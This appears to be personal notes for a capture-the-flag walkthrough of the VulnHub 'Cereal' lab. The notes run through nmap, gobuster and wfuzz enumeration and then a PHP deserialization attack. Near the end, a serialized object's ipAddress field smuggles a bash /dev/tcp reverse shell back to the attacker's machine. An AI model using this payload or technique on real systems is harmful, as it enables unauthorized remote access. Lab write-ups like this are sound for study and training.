### deserialization attack
- Download cereal vulnhub
```bash
arp-scan -I wlo1 --localnet
ping -c 1 192.168.1.9

nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 192.168.1.9 -oG allPorts

namp -sCV -p21,22,80 192.168.1.9 -oN targeted

gobuster dir -u http://192.168.1.9/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

# virtual hosting: cereal.ctf
gobuster vhost -u http://cereal.ctf:44441/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 20

wfuzz -c -t 20 --sl 49 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.cereal.ctf:44441"  http://cereal.ctf:44441/

# ans
000000036:   200        49 L     140 W      1538 Ch     "secure"

# vhost
nvim 192.168.1.9 secure.cereal.ctf

# ping
tcpdump -i wlo1 icmp -n

#ans 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on wlo1, link-type EN10MB (Ethernet), snapshot length 262144 bytes
18:36:02.166682 IP 192.168.1.9 > 192.168.1.11: ICMP echo request, id 2691, seq 1, length 64
18:36:02.166718 IP 192.168.1.11 > 192.168.1.9: ICMP echo reply, id 2691, seq 1, length 64
18:36:02.169581 IP 192.168.1.11 > 192.168.1.9: ICMP echo reply, id 2691, seq 1, length 64
18:36:03.218780 IP 192.168.1.9 > 192.168.1.11: ICMP echo request, id 2691, seq 2, length 64
18:36:03.218833 IP 192.168.1.11 > 192.168.1.9: ICMP echo reply, id 2691, seq 2, length 64
18:36:03.222133 IP 192.168.1.11 > 192.168.1.9: ICMP echo reply, id 2691, seq 2, length 64
18:36:04.242759 IP 192.168.1.9 > 192.168.1.11: ICMP echo request, id 2691, seq 3, length 64
18:36:04.242815 IP 192.168.1.11 > 192.168.1.9: ICMP echo reply, id 2691, seq 3, length 64
18:36:04.250032 IP 192.168.1.11 > 192.168.1.9: ICMP echo reply, id 2691, seq 3, length 64

# burpsuite
POST / HTTP/1.1
Host: secure.cereal.ctf:44441
Content-Length: 111
Cache-Control: max-age=0
Origin: http://secure.cereal.ctf:44441
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://secure.cereal.ctf:44441/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive

obj=O%3A8%3A%22pingTest%22%3A1%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A12%3A%22192.168.1.11%22%3B%7D&ip=192.168.1.11

# ctrl + shift + u
obj=O:8:"pingTest":1:{s:9:"ipAddress";s:12:"192.168.1.11";}&ip=192.168.1.11

# gobuster
gobuster dir -u http://secure.cereal.ctf:44441 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20

# ans
/php                  (Status: 200) [Size: 3699]
/style                (Status: 200) [Size: 3118]
/index                (Status: 200) [Size: 1538]
/back_en              (Status: 301) [Size: 247] [--> http://secure.cereal.ctf:44441/back_en/]

# searching files
gobuster dir -u http://secure.cereal.ctf:44441/back_en -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php.bak

# ans
/index.php.bak        (Status: 200) [Size: 1814]

# we need to creae a deserialized onject
# serialized.php
obj=O%3A8%3A%22pingTest%22%3A3%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A53%3A%22%3B+bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.1.11%2F443+0%3E%261%27%22%3Bs%3A7%3A%22isValid%22%3Bb%3A1%3Bs%3A6%3A%22output%22%3Bs%3A0%3A%22%22%3B%7D&ip=192.168.1.11

# We can do the same wuth nodejs


```